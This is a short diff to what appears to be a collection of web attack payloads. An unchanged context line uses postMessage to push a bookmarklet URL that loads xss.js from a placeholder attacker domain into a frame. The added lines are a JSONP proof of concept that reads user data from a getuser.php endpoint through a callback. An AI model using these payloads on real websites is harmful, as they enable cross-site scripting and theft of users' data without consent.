@@ -3,6 +3,15 @@
 document.getElementById("frame").postMessage('at-share-bookmarklet://ATTACKERDOMAIN/xss.js', '*');
 </script>
 
+jsonp
+<script type="text/javascript">
+function callbackFunction(result)
+        {
+            alert(result.name);
+        }
+</script>
+<script type="text/javascript" src="http://192.168.47.132/getuser.php?jsoncallback=callbackFunction"></script>
+
 
 
 <script>
